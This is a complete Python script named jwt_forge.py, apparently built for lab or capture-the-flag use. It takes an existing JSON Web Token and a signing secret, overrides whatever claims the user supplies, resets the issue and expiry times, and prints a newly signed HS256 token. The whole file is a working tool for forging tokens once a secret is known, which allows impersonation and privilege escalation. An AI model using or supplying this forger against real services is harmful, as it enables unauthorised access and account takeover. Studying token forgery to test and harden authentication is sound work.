#!/usr/bin/env python3
import sys, json, base64, hmac, hashlib, time
from pathlib import Path

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def make_token(secret: str, claims: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(',',':')).encode())
    payload_b64 = b64url_encode(json.dumps(claims, separators=(',',':')).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"

def main():
    if len(sys.argv) < 3:
        print('Usage: jwt_forge.py <orig_token_file|token> <secret> [claims_json]', file=sys.stderr)
        sys.exit(2)
    tok_arg = sys.argv[1]
    token = Path(tok_arg).read_text().strip() if Path(tok_arg).exists() else tok_arg
    parts = token.split('.')
    if len(parts) != 3:
        print('Invalid token provided', file=sys.stderr)
        sys.exit(3)
    header_b, payload_b, _ = parts
    payload = json.loads(base64.urlsafe_b64decode(payload_b + '=' * (-len(payload_b) % 4)))
    # Merge claims override
    if len(sys.argv) >= 4:
        try:
            extra = json.loads(sys.argv[3])
            if isinstance(extra, dict):
                payload.update(extra)
        except Exception:
            pass
    # Refresh iat/exp to be safe
    now = int(time.time())
    payload['iat'] = now
    payload['exp'] = now + 3600
    secret = sys.argv[2]
    forged = make_token(secret, payload)
    print(forged)

if __name__ == '__main__':
    main()
